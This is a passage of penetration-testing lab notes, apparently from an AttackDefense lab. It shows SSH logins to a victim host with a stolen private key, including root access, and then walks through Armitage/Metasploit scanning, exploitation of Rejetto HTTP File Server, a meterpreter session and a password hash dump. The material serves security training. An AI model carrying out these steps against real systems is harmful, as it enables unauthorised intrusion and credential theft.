+root@attackdefense:~# ssh root@192.165.212.3 -i id_rsa 
+The authenticity of host '192.165.212.3 (192.165.212.3)' can't be established.
+ECDSA key fingerprint is SHA256:oqLzK4Uz72ljNbol98v3RyT8BJDLVMAZql/uLIsuonI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.165.212.3' (ECDSA) to the list of known hosts.
+root@victim-1:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+========================================
+login with the private key as a ftp
+========================================
+root@attackdefense:~# ssh ftp@192.165.212.3 -i id_rsa 
+ftp@192.165.212.3's password: 
+ftp@victim-1:~$ exit
+logout
+Connection to 192.165.212.3 closed.
+
+
+========================================
+login with the private key as a jackie
+========================================
+root@attackdefense:~# ssh jackie@192.165.212.3 -i id_rsa 
+jackie@192.165.212.3's password: 
+jackie@victim-1:~$ exit
+logout
+Connection to 192.165.212.3 closed.
+```
+
+
+
+---
+
+### Armitage
+
++ Armitage is a free Java based GUI front-end for the Metasploit Framewor developed by Raphael Mudge and is used to simplify network discovery exploitation and post exploitation.
+
+
+
+
+
+This lab will provide you with the target IP addresses of both **Victim Machine 1** and **Victim Machine 2** in a leafpad window when you first access the lab as shown in the following screenshot.
+
+![1](./assets/1.png)
+
+
+
+**Step 3:** Port scanning & enumeration with Armitage
+
+Before starting up Armitage, you will need to start the **postgresql** database service, this can be done by running the following command:
+
+**Command:**
+
+```
+service postgresql start
+```
+
+
+
+We can start up Armitage by running the following command:
+
+**Command:**
+
+```
+armitage
+```
+
+
+
+After starting up Armitage, you will be prompted to connect to the MSF database as shown in the following screenshot.
+
+![2](./assets/2.png)
+
+After connecting to the MSF database, Armitage will open up as shown in the following screenshot.
+
+![3](./assets/3.png)
+
+We can get started by adding the IP address of **Victim Machine 1**, this can be done clicking on **Hosts** on the toolbar and on **Add Hosts** in the sub-menu as shown in the following screenshot.
+
+![4](./assets/4.png)
+
+You will then be prompted to add the IP address of the target system as shown in the following screenshot.
+
+![5](./assets/5.png)
+
+After adding the IP address of **Victim Machine 1**, the system will be added to the top panel as shown in the following screenshot.
+
+![6](./assets/6.png)
+
+We can perform a port scan on the target system by right-clicking on the system and clicking on **Scan** as shown in the following screenshot.
+
+![7](./assets/7.png)
+
+This will begin the port scan on the target system, after which the  results will be displayed in the bottom output pane as shown in the  following screenshot.
+
+![8](./assets/8.png)
+
+We can also perform an Nmap port scan on the target system by clicking on the **hosts** menu in the toolbar and the **Nmap Scan** option in the submenu as shown in the following screenshot.
+
+![9](./assets/9.png)
+
+You will then be prompted to add the IP address of the target system as shown in the following screenshot.
+
+![10](./assets/10.png)
+
+This will begin the Nmap port scan, after which, the results will be  displayed in the output pane at the bottom as shown in the following  screenshot.
+
+![11](./assets/11.png)
+
+You can now view the open ports and services running on the target system by right-clicking on the system and clicking on **services** as shown in the following screenshot.
+
+![12](./assets/12.png)
+
+As shown in the following screenshot, this will display the list of open ports and services discovered during the port scan.
+
+![13](./assets/13.png)
+
+
+
+---
+
+#### Exploitation & Post Exploitation With Armitage
+
+Analyzing the services running on the target system reveals that the **Rejetto HTTP File Server** running on port 80 can be exploited with a Metasploit module.
+
+We can search for the exploit module by typing in the name of the  service in the module pane as shown in the following screenshot.
+
+![1](./assets/14.png)
+
+After clicking on the module, you will be prompted to configure the module options, more specifically, the **RHOSTS** option as shown in the following screenshot.
+
+![2](.\assets\15)
+
+After configuring the module options, we can click on the **launch** button as shown in the following screenshot.
+
+![3](./assets/16.png)
+
+This will run the module against the target, after the module runs  successfully the system pane will update the image of the target system  to reflect the successful exploitation as shown in the following  screenshot.
+
+![4](./assets/17.png)
+
+We can obtain a **meterpreter** session on the target system by right-clicking on the system, navigating to **Meterpreter 1** and clicking on interact and **Meterpreter shell** as shown in the following screenshot.
+
+![5](./assets/18.png)
+
+![6](./assets/19.png)
+
+We can dump user account hashes from the target system by right-clicking on the target system, clicking on **Meterpreter 1** and dump hashes as shown in the following screenshot.
+
+![7](./assets/20.png)
+
+This will prompt you to specify the SESSION ID option as shown in the following screenshot.
+
+![8](./assets/21.png)
+
+After clicking on **Launch**, the dumped hashes will be displayed in the console panel as shown in the following screenshot.
+
+![9](./assets/22.png)
+
+## 
